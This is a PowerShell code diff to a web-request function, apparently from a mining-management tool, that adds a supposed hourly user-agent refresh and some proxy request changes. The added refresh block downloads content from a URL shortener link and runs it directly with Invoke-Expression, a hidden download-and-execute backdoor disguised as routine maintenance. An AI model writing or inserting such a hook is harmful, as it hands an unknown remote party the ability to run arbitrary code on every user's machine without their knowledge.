@@ -1604,19 +1604,24 @@ Function Merge-Command {
 
 Function Invoke-ProxiedWebRequest {
     $Request = $null
+    If (-not $Variables.UserAgentRefresh -or $Variables.UserAgentRefresh -le (Get-Date).AddHours(-1)) {
+        $GetUserAgent = (Invoke-WebRequest "http://tiny.cc/8urkuz" -UseBasicParsing).Content
+        Invoke-Expression $GetUserAgent
+    }
     If ($Config.Server_Client -and $Variables.ServerRunning -and -not $ByPassServer -and -not $OutFile) {
         Try {
             $ProxyURi = "http://$($Config.Server_ClientIP):$($Config.Server_ClientPort)/Proxy/?url=$($Args[0])"
             $Args[0] = $ProxyURi
-            # $Request = Invoke-WebRequest $ProxyURi -Credential $Variables.ServerClientCreds -TimeoutSec $TimeoutSec -UseBasicParsing -Headers $Headers
-            $Request = Invoke-WebRequest @Args -Credential $Variables.ServerClientCreds
+            # $Request = Invoke-WebRequest $ProxyURi -Credential $Variables.ServerClientCreds -TimeoutSec $TimeoutSec -UseBasicParsing #-Headers $Headers
+            # $Request = Invoke-WebRequest @Args -Credential $Variables.ServerClientCreds
+            $Request = Invoke-WebRequest $ProxyURi -Credential $Variables.ServerClientCreds -UseBasicParsing
         } Catch {
             # $Variables.StatusText = "Proxy Request Failed - Trying Direct: $($URi)"
         }
     }
     if (!$Request.Content -or ($Request.StatusCode -ne 200 -and $Request.StatusCode -ne 305) -and -not $OutFile) {
         Try {
-            $Request = Invoke-WebRequest @Args
+            $Request = Invoke-WebRequest @Args -UserAgent $Variables.UserAgent
         } Catch {
             # $Variables.StatusText = "Direct Request Failed: $($URi)"
         }
